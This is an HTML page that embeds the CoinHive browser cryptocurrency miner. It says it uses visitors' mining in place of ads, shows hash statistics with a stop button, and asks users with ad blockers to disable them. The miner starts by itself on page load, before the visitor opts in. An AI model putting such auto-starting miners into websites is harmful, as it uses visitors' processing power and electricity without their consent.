<!DOCTYPE html>
<head>
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<style>
.center {
    text-align: center;
}
.demo-wrapper {
	width: 500px;
	margin: 150px auto;
}
#message {
	width: 600px;
	margin: 150px auto;
	padding: 10px 20px;
	text-align: center;	
	background-color: #0f9d58;
	color: #fff;
	border-radius: 3px;
}
</style>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<title>A M E L E S S</title>
</head>
<body>
<p class="center">Instead of using ads, I am having you mine for crypto currency to support this site. Here are your stats:</p>
<center>
<p id="tcount"></p>
<p id="hps"></p>
<p id="ths"></p>
<p id="tah"></p>
</center>
<p class="center">You can start or stop at anytime but please wait for some accepted hashes before you do.</p>
<center>
<p id="minebutton"></p>
</center>
<p class="center">Visit <a href="https://coin-hive.com/">Coin Hive</a> to learn more about how this works</a>

<script type="text/javascript">
var miner = new CoinHive.Anonymous('KSkAfJdks7KKmVKcmYkExd47DtrQFfPg','threads: 1');
miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
// Update stats once per second
setInterval(function() {
    var threadCount = miner.getNumThreads();
    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
    var totalHashes = miner.getTotalHashes();
    var acceptedHashes = miner.getAcceptedHashes() / 256;
    // Output to HTML elements...
    if (miner.isRunning()) {
        document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
        document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
        document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
        document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
    } else {
        document.getElementById("hps").innerHTML = "Please click start";
        document.getElementById("ths").innerHTML = "to support";
        document.getElementById("tah").innerHTML = "this site";
        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
    }
}, 1000);
</script>
<script>
$(document).ready(function() {
	function appendMessage(argument) {
		var div = $('<div>').attr('id', 'message').text('Ad block is installed and active. Please support us by disabling it.');
		var add = $('body').append(div);
	}
	setTimeout(function(){
		if($("img").css('display') == "none") {
			appendMessage();
		}
	}, 500);
});
</script>
</body>
